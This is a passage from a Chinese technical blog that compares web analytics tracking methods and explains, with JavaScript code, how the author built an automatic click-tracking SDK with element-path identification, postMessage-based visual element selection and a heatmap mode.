<li>容易与业务逻辑耦合</li>
<li>埋点成本高</li>
<li>如果代码逻辑改动，埋点可能会受影响</li>
<li>存在覆盖问题。埋点更新，用户并未更新代码，则用户仍使用的是旧的埋点逻辑。<h2 id="声明式埋点"><a href="#声明式埋点" class="headerlink" title="声明式埋点"></a>声明式埋点</h2>概念：在相应元素上加标记，该元素相应操作就会发送埋点<br>优点：</li>
<li>和业务逻辑解耦</li>
<li>开发量小<br>缺点：</li>
<li>特有的一些埋点功能无法实现<h2 id="可视化埋点"><a href="#可视化埋点" class="headerlink" title="可视化埋点"></a>可视化埋点</h2>概念：通过在界面上可视化的操作与埋点事件发生联系。</li>
</ol>
<p>优点：</p>
<ol>
<li>埋点效率高</li>
<li>与业务逻辑解耦</li>
<li>易实现埋点数据的标准化</li>
<li>即时发布</li>
</ol>
<p>缺点：</p>
<ol>
<li>功能有限<h2 id="无埋点"><a href="#无埋点" class="headerlink" title="无埋点"></a>无埋点</h2>无埋点其实是全埋点<br>概念：通过绑定事件，自动发送埋点数据。<br>优点：</li>
<li>埋点成本低</li>
</ol>
<p>缺点：</p>
<ol>
<li>会增加通信商流量，后端有一定传输压力</li>
<li>数据虽多却杂，需要分析处理。</li>
</ol>
<h2 id="后端埋点"><a href="#后端埋点" class="headerlink" title="后端埋点"></a>后端埋点</h2><p>概念：在后端采集数据，如采集日志。<br>优点：</p>
<ol>
<li>数据传输稳定<br>缺点：</li>
<li>功能有限</li>
</ol>
<h2 id="埋点平台化、系统化"><a href="#埋点平台化、系统化" class="headerlink" title="埋点平台化、系统化"></a>埋点平台化、系统化</h2><p>埋点需要在系统层面做规划，其中包括埋点规范制定、埋点管理、数据测试、监控等。只有使埋点平台化、系统化，多种埋点方式相结合，才能充分满足业务需求。</p>
<h1 id="干货-实现一个无埋点和可视化埋点的sdk"><a href="#干货-实现一个无埋点和可视化埋点的sdk" class="headerlink" title="[干货]实现一个无埋点和可视化埋点的sdk"></a>[干货]实现一个无埋点和可视化埋点的sdk</h1><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>本文结合自身项目中的一些实践，将无埋点及可视化埋点的实现原理部分抽象整理出了一个sdk。同时也查阅了许多相关资料，发现其实它们在无埋点的实现原理上其实大同小异。</p>
<p>sdk仅介绍和实现了点击事件的无埋点，其他用户行为的埋点也相类似。<br><a href="https://github.com/mfaying/web-log-sdk" target="_blank" rel="noopener">sdk github地址</a> <a href="https://github.com/mfaying/web-log-sdk" target="_blank" rel="noopener">https://github.com/mfaying/web-log-sdk</a></p>
<h2 id="无埋点-1"><a href="#无埋点-1" class="headerlink" title="无埋点"></a>无埋点</h2><p>无埋点实际是全埋点，只要嵌入sdk，就可以自动收集数据。由于不再需要额外的埋点代码，所以也可以称为无埋点。</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>首先，让我们先来看下sdk的演示效果<a href="https://www.readingblog.cn/#/tutorials/circle-select" target="_blank" rel="noopener">体验网址</a> (<a href="https://www.readingblog.cn/#/tutorials/circle-select" target="_blank" rel="noopener">https://www.readingblog.cn/#/tutorials/circle-select</a>)<br><img src="https://mfaying.github.io/static/images/埋点/1.jpg" alt><br>父页面(埋点管理页面)嵌入了一个iframe，指向了一个子页面(嵌入sdk的埋点页面)，sdk可以自动计算点击元素的唯一标识(XPath),以及元素大小、位置等相关信息，将数据发送给后端。同时，也会将这个数据跨域发送给埋点管理页面，管理页面依据这些数据做可视化埋点工作。图中，管理页面可以获取到了元素的信息(包括大小、位置、XPath等)。</p>
<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>sdk的使用方式非常简单<br>首先，在head标签中引入sdk代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://www.readingblog.cn/web-log-sdk-1.0.0.min.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后，初始化sdk，在初始化时你可以传入一些自定义参数。初始化完毕后，sdk就已经在你的页面中工作了，是不是很方便！<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> WebLogger.AutoLogger(&#123;</span><br><span class="line">  debug: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这里是一个简单demo页面，在浏览器打开这个页面。随意点击，每次点击可以在控制台中看到自动打印出的埋点数据。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>web-log-sdk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.readingblog.cn/web-log-sdk-1.0.0.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> WebLogger.AutoLogger(&#123;</span></span><br><span class="line"><span class="javascript">      debug: <span class="literal">true</span>,</span></span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    1</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'1'</span>&gt;</span></span><br><span class="line">      2</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"1"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="无埋点的原理"><a href="#无埋点的原理" class="headerlink" title="无埋点的原理"></a>无埋点的原理</h2><p>无埋点其实监听了document.body上的点击事件。所以页面上的所有点击操作都会发送埋点数据。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_autoClickCollection = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  event.on(doc.body, <span class="string">'click'</span>, <span class="keyword">this</span>._autoClickHandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里就出现了一个问题，虽然这样点击操作能够触发埋点数据发送，但是我们必须确保发送的数据是有价值的。<br>这里最关键的是我们需要知道是页面中的哪个元素触发了用户的点击操作。由于是自动埋点，我们必须思考一种页面元素的标记方式。虽然元素有class、nodeName等标识，但这对于整个页面来说是无法唯一定位一个元素的。元素的id虽然按照规范是唯一的，但也只有个别元素会标记上id属性。<br>所以我们想了一种方式，由于整个html的dom结构像一棵树，对于任意元素(节点)，我们先找到它的父节点，父节点再找它的父节点，这样一直回溯，就会到html(根节点元素)，这样就组成了一条路径，我们将这条路径作为元素的唯一标识。当然了，如果的“XPath”反转一下，由“从父到子”的顺序排列，例如html&gt;body&gt;#app。这样我们通过document.querySelector就可以唯一选中这个被点击的元素了。<br>具体实现如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _getLocalNamePath = <span class="function">(<span class="params">elm</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> XPath = [];</span><br><span class="line">  <span class="keyword">let</span> preCount = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> sib = elm.previousSibling; sib; sib = sib.previousSibling) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sib.localName == elm.localName) preCount ++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (preCount === <span class="number">0</span>) &#123;</span><br><span class="line">    XPath.unshift(elm.localName);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    XPath.unshift(<span class="string">`<span class="subst">$&#123;elm.localName&#125;</span>:nth-of-type(<span class="subst">$&#123;preCount + <span class="number">1</span>&#125;</span>)`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> XPath;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getXPath = <span class="function">(<span class="params">elm</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> allNodes = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'*'</span>);</span><br><span class="line">    <span class="keyword">let</span> XPath = [];</span><br><span class="line">    <span class="keyword">for</span> (; elm &amp;&amp; elm.nodeType == <span class="number">1</span>; elm = elm.parentNode) &#123;</span><br><span class="line">      <span class="keyword">if</span> (elm.hasAttribute(<span class="string">'id'</span>)) &#123;</span><br><span class="line">        <span class="keyword">let</span> uniqueIdCount = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; allNodes.length; n++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (allNodes[n].hasAttribute(<span class="string">'id'</span>) &amp;&amp; allNodes[n].id == elm.id) uniqueIdCount++;</span><br><span class="line">          <span class="keyword">if</span> (uniqueIdCount &gt; <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (uniqueIdCount == <span class="number">1</span>) &#123;</span><br><span class="line">          XPath.unshift(<span class="string">`#<span class="subst">$&#123;elm.getAttribute(<span class="string">'id'</span>)&#125;</span>`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          XPath.unshift(..._getLocalNamePath(elm));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        XPath.unshift(..._getLocalNamePath(elm));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> XPath.length ? XPath.join(<span class="string">'&gt;'</span>) : <span class="literal">null</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> getXPath;</span><br></pre></td></tr></table></figure></p>
<p>代码中我们还做一些处理，比如当有多个localName相同的兄弟节点时，常见的例如<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">3</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br></pre></td></tr></table></figure></p>
<p>我们通过:nth-of-type选择器来区分。</p>
<p>如果有id属性，为了确保id是唯一的(规范要求必须唯一，但开发者也有可能会在无意间赋上重复的id属性)，我们做了检查，如果是唯一的就使用id作为标记，这样可以提高选择器的效率。</p>
<p>确定了元素的唯一标识，接下来的事情就很简单了。我们只需获取所需要的埋点数据，将其发送给后端就可以了。</p>
<p>比如获取元素位置信息<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getBoundingClientRect = <span class="function">(<span class="params">elm</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> rect = elm.getBoundingClientRect();</span><br><span class="line">  <span class="keyword">const</span> width = rect.width || rect.right - rect.left;</span><br><span class="line">  <span class="keyword">const</span> height = rect.height || rect.bottom - rect.top;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    width,</span><br><span class="line">    height,</span><br><span class="line">    left: rect.left,</span><br><span class="line">    top: rect.top,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> getBoundingClientRect;</span><br></pre></td></tr></table></figure></p>
<p>获取平台信息<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ua &#125; <span class="keyword">from</span> <span class="string">'../common/bom'</span>;</span><br><span class="line"><span class="keyword">import</span> platform <span class="keyword">from</span> <span class="string">'platform'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getPlatform = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> platformInfo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  platformInfo.os = <span class="string">`<span class="subst">$&#123;platform.os.family&#125;</span> <span class="subst">$&#123;platform.os.version&#125;</span>`</span> || <span class="string">''</span>;</span><br><span class="line">  platformInfo.bn = platform.name || <span class="string">''</span>;</span><br><span class="line">  platformInfo.bv = platform.version || <span class="string">''</span>;</span><br><span class="line">  platformInfo.bl = platform.layout || <span class="string">''</span>;</span><br><span class="line">  platformInfo.bd = platform.description || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> wechatInfo = ua.match(<span class="regexp">/MicroMessenger\/([\d\.]+)/i</span>);</span><br><span class="line">  <span class="keyword">const</span> wechatNetType = ua.match(<span class="regexp">/NetType\/([\w\.]+)/i</span>);</span><br><span class="line">  <span class="keyword">if</span> (wechatInfo) &#123;</span><br><span class="line">    platformInfo.mmv = wechatInfo[<span class="number">1</span>] || <span class="string">''</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wechatNetType) &#123;</span><br><span class="line">    platformInfo.net = wechatNetType[<span class="number">1</span>] || <span class="string">''</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> platformInfo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> getPlatform;</span><br></pre></td></tr></table></figure></p>
<p>当前url、引用url、title、事件的触发时刻等等信息都可以补充进去。这是我的sdk发送的一个埋点数据<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"eventData"</span>: &#123;</span><br><span class="line">		<span class="attr">"et"</span>: <span class="string">"click"</span>,</span><br><span class="line">		<span class="attr">"ed"</span>: <span class="string">"auto_click"</span>,</span><br><span class="line">		<span class="attr">"text"</span>: <span class="string">"参考： Elasticsear...icsearch 2.x 版本"</span>,</span><br><span class="line">		<span class="attr">"nodeName"</span>: <span class="string">"p"</span>,</span><br><span class="line">		<span class="attr">"XPath"</span>: <span class="string">"html&gt;body&gt;#app&gt;section&gt;section&gt;main&gt;div:nth-of-type(5)&gt;div&gt;p&gt;p"</span>,</span><br><span class="line">		<span class="attr">"offsetX"</span>: <span class="string">"0.768987"</span>,</span><br><span class="line">		<span class="attr">"offsetY"</span>: <span class="string">"0.333333"</span>,</span><br><span class="line">		<span class="attr">"pageX"</span>: <span class="number">263</span>,</span><br><span class="line">		<span class="attr">"pageY"</span>: <span class="number">167</span>,</span><br><span class="line">		<span class="attr">"scrollX"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"scrollY"</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">"left"</span>: <span class="number">20</span>,</span><br><span class="line">		<span class="attr">"top"</span>: <span class="number">153</span>,</span><br><span class="line">		<span class="attr">"width"</span>: <span class="number">316</span>,</span><br><span class="line">		<span class="attr">"height"</span>: <span class="number">42</span>,</span><br><span class="line">		<span class="attr">"rUrl"</span>: <span class="string">"http://localhost:8080/"</span>,</span><br><span class="line">		<span class="attr">"docTitle"</span>: <span class="string">"blog"</span>,</span><br><span class="line">		<span class="attr">"cUrl"</span>: <span class="string">"http://localhost:8080/#/blog/article/74"</span>,</span><br><span class="line">		<span class="attr">"t"</span>: <span class="number">1573987603156</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"optParams"</span>: &#123;&#125;,</span><br><span class="line">	<span class="attr">"platform"</span>: &#123;</span><br><span class="line">		<span class="attr">"os"</span>: <span class="string">"Android 6.0"</span>,</span><br><span class="line">		<span class="attr">"bn"</span>: <span class="string">"Chrome Mobile"</span>,</span><br><span class="line">		<span class="attr">"bv"</span>: <span class="string">"77.0.3865.120"</span>,</span><br><span class="line">		<span class="attr">"bl"</span>: <span class="string">"Blink"</span>,</span><br><span class="line">		<span class="attr">"bd"</span>: <span class="string">"Chrome Mobile 77.0.3865.120 on Google Nexus 5 (Android 6.0)"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"appID"</span>: <span class="string">""</span>,</span><br><span class="line">	<span class="attr">"sdk"</span>: &#123;</span><br><span class="line">		<span class="attr">"type"</span>: <span class="string">"js"</span>,</span><br><span class="line">		<span class="attr">"version"</span>: <span class="string">"1.0.0"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="实现可视化圈选埋点"><a href="#实现可视化圈选埋点" class="headerlink" title="实现可视化圈选埋点"></a>实现可视化圈选埋点</h2><p>可视化埋点一般会使用iframe将埋点页面嵌入。这时子页面是埋点页面(由iframe引入)、父页面是管理页面。由于iframe的src属性是支持跨域加载资源的，所以任何埋点页面都是可以嵌入的。</p>
<p>但是要实现圈选功能，必须实现埋点页面和管理页面的通信，因为管理页面是不知道埋点信息的。而且由于埋点页面是跨域的，管理页面根本无法操作埋点页面。</p>
<p>这里我们就需要sdk实现一种通信机制了，我们采用通用的跨域通信方案postMessage。<br>在sdk的配置项中增加一个postMsgOpts字段用来配置postMessage参数，postMsgOpts的默认值是一个空数组，也就是说它可以允许埋点页面向多个源发送数据，而它的默认配置是不会通过postMessage发送数据的。<br>postMsgOpts字段配置示例如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> AutoLogger(&#123;</span><br><span class="line">  debug: <span class="literal">true</span>,</span><br><span class="line">  postMsgOpts: [&#123;</span><br><span class="line">    targetWindow: <span class="built_in">window</span>.parent,</span><br><span class="line">    targetOrigin,</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    targetWindow: <span class="built_in">window</span>,</span><br><span class="line">    targetOrigin: curOrigin,</span><br><span class="line">  &#125;],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这样将要发送的埋点数据也会调用postMessage api发送一份。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">postMsgOpts.forEach(<span class="function">(<span class="params">opt</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; targetWindow, targetOrigin &#125; = opt;</span><br><span class="line">  targetWindow.postMessage(&#123; <span class="attr">logData</span>: <span class="built_in">JSON</span>.stringify(logData) &#125;, targetOrigin)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>我们回过头来分析演示是如何实现可视化埋点的。首先管理页面的iframe加载了埋点页面，由于埋点页面引入了sdk，所以点击页面中任何元素，都会将埋点数据通过postMessage发送一份给管理页面。这里的数据包括了元素的大小和位置、XPath等等。管理页面只要监听了”message”事件，就可以拿到从子页面(埋点页面)传出来的数据了。为了交互友好，根据这些信息管理页面可以圈出iframe中选中的元素。当然了，只要管理页面拿到了埋点数据，就可以在这基础上和使用管理页面的用户交互，做一些自主配置同时将附加信息及选中元素的信息传递给后端，这样后端就可以对选中元素做处理了，从而实现可视化埋点。</p>
<h2 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h2><p>最后介绍一下我的sdk的配置项，先参考一下默认配置<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> getPlatform <span class="keyword">from</span> <span class="string">'../../utils/getPlatform'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> platform = getPlatform();</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  appID: <span class="string">''</span>,</span><br><span class="line">  <span class="comment">// 是否自动收集点击事件</span></span><br><span class="line">  autoClick: <span class="literal">true</span>,</span><br><span class="line">  debug: <span class="literal">false</span>,</span><br><span class="line">  logUrl: <span class="string">''</span>,</span><br><span class="line">  sdk: &#123;</span><br><span class="line">    <span class="comment">// 类型</span></span><br><span class="line">    type: <span class="string">'js'</span>,</span><br><span class="line">    <span class="comment">// 版本</span></span><br><span class="line">    version: SDK_VERSION,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 平台参数</span></span><br><span class="line">  platform,</span><br><span class="line">  optParams: &#123;&#125;,</span><br><span class="line">  postMsgOpts: [],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>appID 你可以在初始化时注册一个appID，所以相关的埋点都会带上这个标记，相当于对埋点数据做了一层app维度上的管理。</li>
<li>autoClick 默认为true，开启会自动收集点击事件(即点击无埋点)。当然你可以实现页面登录、登出、浏览时间的埋点功能，同时可以在配置中加开关控制，让用户可以有选择地启用这些功能。</li>
<li>debug 默认不开启，开启会将埋点数据打印到控制台，便于调试。</li>
<li>logUrl 接收日志的后端地址</li>
<li>sdk sdk自身信息一些说明</li>
<li>platform 默认会自动获取一些平台参数，你也可以通过配置这个字段覆盖它</li>
<li>optParams 自定义数据</li>
</ol>
<h1 id="growing-io圈选及热力图功能的实现"><a href="#growing-io圈选及热力图功能的实现" class="headerlink" title="growing.io圈选及热力图功能的实现"></a>growing.io圈选及热力图功能的实现</h1><p>growing.io圈选及热力图功能还是比较好用的，这周调研了它的技术实现，发现其实并不复杂。</p>
<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h2><p><img src="https://mfaying.github.io/static/images/web-log-sdk/1.gif" alt></p>
<h2 id="sdk"><a href="#sdk" class="headerlink" title="sdk"></a>sdk</h2><p>之前自己实现了一个无埋点<a href="https://github.com/mfaying/web-log-sdk" target="_blank" rel="noopener">sdk</a>(<a href="https://github.com/mfaying/web-log-sdk" target="_blank" rel="noopener">https://github.com/mfaying/web-log-sdk</a>)<br>也介绍了<a href="https://juejin.im/post/5dd158d46fb9a01fff5e7499" target="_blank" rel="noopener">无埋点的实现原理</a>(<a href="https://juejin.im/post/5dd158d46fb9a01fff5e7499" target="_blank" rel="noopener">https://juejin.im/post/5dd158d46fb9a01fff5e7499</a>)<br>现在我们在这个sdk的基础上增加圈选及热力图功能。</p>
<h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><p>由于sdk页面在埋点系统中会嵌入在一个iframe里，所以我们必须使sdk具备跨域通信的能力。这里我们使用的是postMessage，sdk会监听埋点系统发送的消息，来决定是否开启圈选或热力图模式。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_addMessageListener = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  eventUtil.on(win, <span class="string">'message'</span>, (event) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(event.data)&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="built_in">JSON</span>.parse(event.data);</span><br><span class="line">        <span class="keyword">const</span> &#123; mode, status &#125; = data;</span><br><span class="line">        <span class="keyword">if</span> (mode === MODE.CIRCLE_SELECT) &#123;</span><br><span class="line">          <span class="keyword">if</span> (status === <span class="string">'on'</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mode = mode;</span><br><span class="line">            <span class="keyword">this</span>._autoHoverCollection();</span><br><span class="line">            <span class="keyword">this</span>._appendWLSStyle();</span><br><span class="line">            <span class="keyword">this</span>._removeHeatmapCanvas();</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="string">'off'</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mode = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">this</span>._autoHoverCollectionOff();</span><br><span class="line">            <span class="keyword">this</span>._removeWLSStyle();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode === MODE.HEATMAP) &#123;</span><br><span class="line">          <span class="keyword">if</span> (status === <span class="string">'on'</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mode = mode;</span><br><span class="line">            <span class="keyword">this</span>._autoHoverCollection();</span><br><span class="line">            <span class="keyword">this</span>._appendWLSStyle();</span><br><span class="line">            <span class="keyword">this</span>._fetchHeatmap().then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">this</span>._drawHeatmap(res.data.data);</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="string">'off'</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mode = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">this</span>._autoHoverCollectionOff();</span><br><span class="line">            <span class="keyword">this</span>._removeWLSStyle();</span><br><span class="line">            <span class="keyword">this</span>._removeHeatmapCanvas();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="圈选模式"><a href="#圈选模式" class="headerlink" title="圈选模式"></a>圈选模式</h2><p>当开启圈选模式时，sdk会自动采集”hover事件”，在页面中插入一段css(元素被圈选时会加上圈选类名，这段css就是圈选类名的样式)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (status === <span class="string">'on'</span>) &#123;</span><br><span class="line">  <span class="keyword">this</span>.mode = mode;</span><br><span class="line">  <span class="keyword">this</span>._autoHoverCollection();</span><br><span class="line">  <span class="keyword">this</span>._appendWLSStyle();</span><br><span class="line">  <span class="keyword">this</span>._removeHeatmapCanvas();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>元素hover时会增加一个圈选类名，并阻止页面跳转等默认事件，同时将数据发送给埋点平台。<br>埋点平台接收到这个数据就可以自主做圈选分析了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_autoHoverHandle = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; event, targetElement &#125; = getEvent(e);</span><br><span class="line">    <span class="keyword">const</span> assignData = &#123;</span><br><span class="line">      et: <span class="string">'mouseenter'</span>,</span><br><span class="line">      ed: <span class="string">'auto_hover'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> logData = <span class="keyword">this</span>._getLogData(e, assignData);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mode === MODE.CIRCLE_SELECT || <span class="keyword">this</span>.mode === MODE.HEATMAP) &#123;</span><br><span class="line">      <span class="keyword">this</span>._selectElement(event, targetElement);</span><br><span class="line">      <span class="keyword">this</span>._postMessage(logData);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_selectElement = <span class="function">(<span class="params">event, targetElement</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> elems = doc.getElementsByClassName(WLS_CLICK_SELECT);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, len = elems.length; i &lt; len; i ++) &#123;</span><br><span class="line">    elems[i].classList.remove(WLS_CLICK_SELECT);</span><br><span class="line">  &#125;</span><br><span class="line">  eventUtil.stopDefault(event);</span><br><span class="line">  targetElement.classList.add(WLS_CLICK_SELECT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
